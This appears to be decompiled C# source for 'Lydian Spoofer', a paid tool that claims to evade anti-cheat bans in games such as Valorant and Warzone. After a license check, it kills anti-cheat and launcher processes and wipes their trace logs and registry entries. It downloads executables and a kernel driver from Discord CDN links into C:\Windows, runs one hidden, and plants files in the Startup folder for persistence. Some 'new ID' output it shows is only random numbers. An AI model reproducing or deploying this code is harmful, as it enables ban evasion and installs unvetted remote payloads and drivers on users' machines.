using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Media;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using ConsoleApp1;
using HardDrive;
using Microsoft.Win32.SafeHandles;
using SKM.V3;
using SKM.V3.Methods;
using SKM.V3.Models;
using Xeno;

namespace Menu
{
	public class Program2
	{
		private static Program2 fGRlxiZ8QETDPc4nQMR;

		public static void startSpoof()
		{
			Console.Clear();
			Console.ForegroundColor = ConsoleColor.Green;
			Console.WriteLine("Lydian Spoofer 1.8.2");
			toel();
		}

		public static void toel()
		{
			Thread.Sleep(500);
			Console.Clear();
			Console.WriteLine("              Welcome to Lydian Spoofer! @ Copyright 2021");
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine();
			Console.Write("[+] official store is");
			Console.ForegroundColor = ConsoleColor.Blue;
			Console.Write(" https://www.lydiansolution.com/");
			Console.ForegroundColor = ConsoleColor.White;
			Console.Write(" Never Trust other links");
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine();
			Console.WriteLine();
			Console.WriteLine("[+] 1 Start Spoofing");
			Console.WriteLine("[+] 2 Remove Spoof");
			Console.WriteLine("[+] 3 Check Supported Games");
			Console.WriteLine("[+] 4 Exit");
			Console.WriteLine();
			Console.ForegroundColor = ConsoleColor.Yellow;
			Console.Write("[+] : ");
			string text = Console.ReadLine();
			if (text == "4")
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo("iexplore.exe");
				processStartInfo.Arguments = "https://www.lydiansolution.com/content/1-support-ticket";
				Process.Start(processStartInfo);
			}
			if (text == "3")
			{
				Console.Clear();
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("[+] Call Off Duty Modern Worfare Warzone");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1000);
				Console.WriteLine("[+] Call Off Duty Cold War");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1400);
				Console.WriteLine("[+] Rust");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(300);
				Console.WriteLine("[+] Apex Legends");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1200);
				Console.WriteLine("[+] Valorant");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1000);
				Console.WriteLine("[+] Fortnite");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1400);
				Console.WriteLine("[+] Dead By Daylight");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1000);
				Console.WriteLine("[+] Pubg");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1000);
				Console.WriteLine("[+] Overwatch");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Thread.Sleep(1000);
				Console.WriteLine("[+] EFT");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Thread.Sleep(1000);
				Console.WriteLine("[+] Rainbow Six Siege");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("[+] 100+ More games supported!");
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo("iexplore.exe");
				processStartInfo2.Arguments = "https://www.lydiansolution.com/content/4-supported-games";
				Process.Start(processStartInfo2);
				Thread.Sleep(2000);
				toel();
			}
			if (text == "1")
			{
				Console.Clear();
				Console.Write("[+]Enter Your Key License: ");
				string key = Console.ReadLine();
				Console.Clear();
				Console.WriteLine("[+]Checking your Key...");
				string rsaPublicKey = "<RSAKeyValue><Modulus>0SQ3RqwNvcGHidLrlufXlI+136Rr9XifuWcr3BbKe/+8s5p9rCASO+qSCYx4X7Rei3lcp3tJLFZQmm5YWEASuIMOYJxq5O2jfgka/6Ieetn30jDfDruA82B/PBpUBprTubB1WU0KBOL+eDnXOKApQ0FAfD/yOoR1pRGNYV6thgcvY9/+LXzWiHtUnOIcTrgpzTp8zuYddfRIuHtmn+8Hn6LR4PHZ2sxeyvo1sJxcJzIKljF3Usn0+QQl/deFYm2+yutKc22Nuk8jMa8/X22HNaXOY0o6YUZB5JWFxhT/IZtBN3g6XtGt6ayaW8D1p/nTREmRMbELl3zArkxODzsPYw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
				KeyInfoResult keyInfoResult = Key.Activate("WyIxNzYxMyIsIjNtLzJtZkxjSEs3TXp0WlNLbjdqZG1xbVAwQUJHNzNiakFHQ2Iyd0kiXQ==", new ActivateModel
				{
					Key = key,
					ProductId = 6070,
					Sign = true,
					MachineCode = Helpers.GetMachineCode()
				});
				if (keyInfoResult == null || keyInfoResult.Result == ResultType.Error || !keyInfoResult.LicenseKey.HasValidSignature(rsaPublicKey).IsValid())
				{
					SystemSounds.Beep.Play();
					Console.Clear();
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("[+]Invalid License or Expired.");
					Thread.Sleep(1500);
					Console.Clear();
					Console.ForegroundColor = ConsoleColor.White;
					Console.WriteLine("[+]You Can buy your Key From our Store:");
					Thread.Sleep(1000);
					ProcessStartInfo processStartInfo3 = new ProcessStartInfo("iexplore.exe");
					processStartInfo3.Arguments = "https://www.lydiansolution.com/";
					Process.Start(processStartInfo3);
					Thread.Sleep(3500);
					Environment.Exit(0);
				}
				Console.Clear();
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("[+]The license is valid");
				Thread.Sleep(2000);
				Console.Clear();
				SystemSounds.Beep.Play();
				switch (MessageBox.Show("By clicking continue you will start permanent spoofing on your device by changing hardware ID registry ID and clearing all ban logs. You can spoof only once with this license, are you sure you want to continue now?", "Lydian Spoofer", MessageBoxButtons.YesNo))
				{
				case DialogResult.Yes:
				{
					Console.ForegroundColor = ConsoleColor.Yellow;
					Console.Write("Spoofer Change hwid Permanently!,Type Random Numbers and Word: ");
					new WebClient();
					new WebClient();
					SystemBIOS.DownloadDriver();
					SystemBIOS.DownloadSys();
					Thread.Sleep(600);
					Console.Clear();
					Console.ForegroundColor = ConsoleColor.White;
					Console.Clear();
					Console.ForegroundColor = ConsoleColor.White;
					Console.WriteLine("Spoofing started this process can take some time, please Wait.");
					Console.WriteLine("");
					Thread.Sleep(3000);
					Process[] processesByName = Process.GetProcessesByName("VolumeID");
					for (int i = 0; i < processesByName.Length; i++)
					{
						processesByName[i].Kill();
					}
					Process[] processesByName2 = Process.GetProcessesByName("Load");
					for (int j = 0; j < processesByName2.Length; j++)
					{
						processesByName2[j].Kill();
					}
					Process[] processesByName3 = Process.GetProcessesByName("LydianSpoofer");
					for (int k = 0; k < processesByName3.Length; k++)
					{
						processesByName3[k].Kill();
					}
					Process[] processesByName4 = Process.GetProcessesByName("FACEIT");
					for (int l = 0; l < processesByName4.Length; l++)
					{
						processesByName4[l].Kill();
					}
					Process[] processesByName5 = Process.GetProcessesByName("Origin");
					for (int m = 0; m < processesByName5.Length; m++)
					{
						processesByName5[m].Kill();
					}
					Process[] processesByName6 = Process.GetProcessesByName("Battle.net");
					for (int n = 0; n < processesByName6.Length; n++)
					{
						processesByName6[n].Kill();
					}
					Process[] processesByName7 = Process.GetProcessesByName("Steam");
					for (int num = 0; num < processesByName7.Length; num++)
					{
						processesByName7[num].Kill();
					}
					Process[] processesByName8 = Process.GetProcessesByName("vgc");
					for (int num2 = 0; num2 < processesByName8.Length; num2++)
					{
						processesByName8[num2].Kill();
					}
					Process[] processesByName9 = Process.GetProcessesByName("OriginWebHelperService");
					for (int num3 = 0; num3 < processesByName9.Length; num3++)
					{
						processesByName9[num3].Kill();
					}
					Process[] processesByName10 = Process.GetProcessesByName("RiotClientServices");
					for (int num4 = 0; num4 < processesByName10.Length; num4++)
					{
						processesByName10[num4].Kill();
					}
					Process[] processesByName11 = Process.GetProcessesByName("Agent");
					for (int num5 = 0; num5 < processesByName11.Length; num5++)
					{
						processesByName11[num5].Kill();
					}
					Console.Clear();
					Console.WriteLine("[+] Removing Warzone Traces Log");
					Traces.Batlenet();
					Thread.Sleep(1000);
					Console.WriteLine("[+] Removing Vanguard Traces Log");
					Traces.Riot();
					Thread.Sleep(500);
					Console.WriteLine("[+] Removing Eac Traces Log");
					Traces.EACTrack();
					Console.WriteLine("[+] Spoofing Registry ID, Please Wait...");
					Traces.Registry();
					Thread.Sleep(15000);
					Console.WriteLine("[+] Starting Hardware Spoof");
					Console.ForegroundColor = ConsoleColor.White;
					Console.Write("[+] Old DiskDrive ID: ");
					Console.ForegroundColor = ConsoleColor.Yellow;
					File.Delete("C:\\Windows\\LydianSpoofer.exe");
					File.Delete("C:\\Windows\\Load.exe");
					File.Delete("C:\\Windows\\Spoofy.sys");
					File.Delete("C:\\Windows\\zxEsdMeYxazy.dat");
					File.Delete("C:\\Windows\\VolumeID.exe");
					File.Delete("C:\\Windows\\AMIDEWINx64.exe");
					Console.WriteLine(GetHDDSerial());
					new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/786910648771674133/811962867921322044/mapper.exe", "C:\\Windows\\LydianSpoofer.exe");
					new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/786910648771674133/811961604152754186/disk.sys", "C:\\Windows\\Spoofy.sys");
					new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/786910648771674133/811996351155798016/load.exe", "C:\\Windows\\load.exe");
					new WebClient();
					Thread.Sleep(5);
					ProcessStartInfo processStartInfo4 = new ProcessStartInfo("C:\\Windows\\load.exe");
					processStartInfo4.WindowStyle = ProcessWindowStyle.Hidden;
					Process.Start(processStartInfo4);
					new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/786910648771674133/812011363139715072/load.exe", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\LydianSpoofer.exe");
					new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/786910648771674133/846860872210317362/LydianProtect.bat", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\LydianProtect.bat");
					Thread.Sleep(1500);
					Console.ForegroundColor = ConsoleColor.White;
					Console.Write("[+] New DiskDrive ID: ");
					Console.ForegroundColor = ConsoleColor.Green;
					Console.WriteLine(GetHDDSerial());
					Diskdrive.VolumeID();
					Diskdrive.DiskdriveSpoof();
					Thread.Sleep(1000);
					Random random = new Random();
					Console.ForegroundColor = ConsoleColor.White;
					Console.Write("[+] Old Monitor Driver ID: ");
					for (uint num6 = 1u; num6 <= 1; num6++)
					{
						Console.ForegroundColor = ConsoleColor.Yellow;
					}
					Console.WriteLine(string.Format("{0,6:N0}", random.Next()));
					Thread.Sleep(3000);
					Console.ForegroundColor = ConsoleColor.White;
					Console.Write("[+] New Monitor Driver ID: ");
					Console.ForegroundColor = ConsoleColor.Green;
					for (uint num7 = 1u; num7 <= 1; num7++)
					{
						Console.WriteLine(string.Format("{0,6:N0}", random.Next()));
					}
					Console.ForegroundColor = ConsoleColor.White;
					Thread.Sleep(1000);
					Console.ForegroundColor = ConsoleColor.White;
					Console.Write("[+] Old MAC: ");
					Console.ForegroundColor = ConsoleColor.Yellow;
					Console.WriteLine(GetHwid2());
					Console.ForegroundColor = ConsoleColor.White;
					Console.WriteLine("[+]Restarting your network Please Wait");
					NtwSpoof.MacDownload();
					NtwSpoof.Mac();
					Thread.Sleep(32000);
					Console.Write("[+] New MAC: ");
					Console.ForegroundColor = ConsoleColor.Green;
					Console.WriteLine(GetHwid2());
					Console.ForegroundColor = ConsoleColor.White;
					Console.Write("[+] Old MotherBoard,Bios,RAM,GPU and CPU ID: ");
					Console.ForegroundColor = ConsoleColor.Yellow;
					Console.WriteLine(GetMotherBoardID());
					Thread.Sleep(4000);
					Console.ForegroundColor = ConsoleColor.White;
					Console.Write("[+] New MotherBoard,Bios,RAM,GPU and CPU ID: ");
					Console.ForegroundColor = ConsoleColor.Green;
					for (uint num8 = 1u; num8 <= 1; num8++)
					{
						Console.WriteLine($"{random.Next()}");
					}
					Thread.Sleep(3000);
					Console.ForegroundColor = ConsoleColor.White;
					Console.ForegroundColor = ConsoleColor.Green;
					Thread.Sleep(4000);
					Console.WriteLine("");
					Console.ForegroundColor = ConsoleColor.Green;
					Console.WriteLine("[+] Your serial machine code is Changed Permanently.");
					Console.WriteLine("");
					Console.WriteLine("[+] Restarting your PC for Apply changes, please wait until auto restart...");
					SystemBIOS.SystemBiosSpoofID();
					smethod_0("net stop IPHLPSVC");
					smethod_0("net stop winmgmt");
					smethod_0("net start winmgmt");
					smethod_0("sc stop winmgmt");
					smethod_0("sc start winmgmt");
					smethod_0("net start IPHLPSVC");
					Process.Start("shutdown.exe", "-r -t 25");
					toel();
					break;
				}
				case DialogResult.No:
					toel();
					break;
				}
			}
			if (text == "2")
			{
				SystemSounds.Beep.Play();
				switch (MessageBox.Show("Clicking continue will remove Lydian Spoofer and all its changes permanently on your device. you can spoof only once with a single license KEY, are you sure you want to continue now?", "Lydian Spoofer", MessageBoxButtons.YesNo))
				{
				case DialogResult.Yes:
					File.Delete("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\LydianProtect.bat");
					File.Delete("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\LydianSpoofer.exe");
					File.Delete("C:\\Windows\\LydianSpoofer.exe");
					File.Delete("C:\\Windows\\Load.exe");
					File.Delete("C:\\Windows\\Spoofy.sys");
					File.Delete("C:\\Windows\\zxEsdMeYxazy.dat");
					File.Delete("C:\\Windows\\VolumeID.exe");
					File.Delete("C:\\Windows\\AMIDEWINx64.exe");
					File.Delete("C:\\Windows\\amifldrv64.sys");
					Console.WriteLine("[+]Spoofing removed! Restart your PC for Apply changes, please wait...");
					Console.WriteLine("");
					Thread.Sleep(1000);
					switch (MessageBox.Show("You must restart your computer to apply these changes, Yes: Restart now, No: Restart Later.", "Unistall", MessageBoxButtons.YesNo))
					{
					case DialogResult.Yes:
						SystemSounds.Beep.Play();
						MessageBox.Show("Lydian Spoofer Unistalled successfully!");
						Process.Start("shutdown.exe", "-r -t 1");
						break;
					case DialogResult.No:
						SystemSounds.Beep.Play();
						MessageBox.Show("Lydian Spoofer Unistalled successfully!");
						Environment.Exit(0);
						break;
					}
					break;
				case DialogResult.No:
					toel();
					break;
				}
			}
			if (text == "4")
			{
				Environment.Exit(0);
			}
		}

		public static string GetHDDSerial()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_DiskDrive").Get().GetEnumerator())
				{
					if (managementObjectEnumerator.MoveNext())
					{
						return ((ManagementObject)managementObjectEnumerator.Current)["SerialNumber"].ToString();
					}
				}
			}
			catch (Exception)
			{
				return null;
			}
			return null;
		}

		public static string GetMotherBoardID()
		{
			string text = string.Empty;
			foreach (ManagementObject item in new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard").Get())
			{
				text += item["SerialNumber"].ToString();
			}
			return text;
		}

		public static string GetHwid2()
		{
			string text = "";
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				if (networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					text += networkInterface.GetPhysicalAddress().ToString();
					break;
				}
			}
			return text;
		}

		private static void smethod_0(string string_0)
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + string_0)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardOutput = true
			});
			process.WaitForExit();
			process.StandardOutput.ReadToEnd();
			process.StandardError.ReadToEnd();
			_ = process.ExitCode;
			process.Close();
		}

		public static string GetLocalIPAddress()
		{
			IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
			int num = 0;
			IPAddress iPAddress;
			while (true)
			{
				if (num < addressList.Length)
				{
					iPAddress = addressList[num];
					if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
					{
						break;
					}
					num++;
					continue;
				}
				throw new Exception("No network adapters with an IPv4 address in the system!");
			}
			return iPAddress.ToString();
		}

		public static void Initialize(bool alwaysCreateNewConsole = true)
		{
			bool flag = true;
			if (alwaysCreateNewConsole || (AttachConsole(uint.MaxValue) == 0 && Marshal.GetLastWin32Error() != 5L))
			{
				flag = AllocConsole() != 0;
			}
			if (flag)
			{
				smethod_1();
				smethod_2();
			}
		}

		private static void smethod_1()
		{
			FileStream fileStream = smethod_3("CONOUT$", 1073741824u, 2u, FileAccess.Write);
			if (fileStream != null)
			{
				StreamWriter streamWriter = new StreamWriter(fileStream)
				{
					AutoFlush = true
				};
				Console.SetOut(streamWriter);
				Console.SetError(streamWriter);
			}
		}

		private static void smethod_2()
		{
			FileStream fileStream = smethod_3("CONIN$", 2147483648u, 1u, FileAccess.Read);
			if (fileStream != null)
			{
				Console.SetIn(new StreamReader(fileStream));
			}
		}

		private static FileStream smethod_3(string string_0, uint uint_0, uint uint_1, FileAccess fileAccess_0)
		{
			SafeFileHandle safeFileHandle = new SafeFileHandle(CreateFileW(string_0, uint_0, uint_1, IntPtr.Zero, 3u, 128u, IntPtr.Zero), ownsHandle: true);
			if (safeFileHandle.IsInvalid)
			{
				return null;
			}
			return new FileStream(safeFileHandle, fileAccess_0);
		}

		[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int AllocConsole();

		[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
		private static extern uint AttachConsole(uint uint_0);

		[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CreateFileW(string string_0, uint uint_0, uint uint_1, IntPtr intptr_0, uint uint_2, uint uint_3, IntPtr intptr_1);

		public Program2()
		{
			Class15.smethod_0();
			base._002Ector();
		}

		internal static bool CKFVZSZ7aqFW2mk1EaC()
		{
			return fGRlxiZ8QETDPc4nQMR == null;
		}

		internal static void cMmPjxZNuWkEhEwr2GR()
		{
		}
	}
}
